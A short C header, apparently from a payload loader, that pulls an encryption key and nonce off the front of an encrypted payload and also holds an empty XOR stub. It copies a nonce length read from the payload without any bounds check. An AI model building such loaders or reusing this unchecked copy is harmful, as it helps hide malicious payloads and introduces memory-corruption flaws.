#pragma once
#include "../../includes/core/core.h"

static inline unsigned char* payload_extract_crypto_info(unsigned char* encPayload, int PayloadSize, int* encSize) {
    int index = 0;

    memcpy(g_ldr->config->EncryptionKey, encPayload, 32);
    index += 32;

    DWORD NonceLen;
    memcpy(&NonceLen, encPayload + index, sizeof(DWORD));
    index += sizeof(DWORD);

    if (NonceLen > 0) {
        memcpy(g_ldr->config->Nonce, encPayload + index, NonceLen);
        index += NonceLen;
    }

    *encSize = PayloadSize - index;
    return encPayload + index;
}



static inline void xor_data(unsigned char* in, int key) {
    return;
}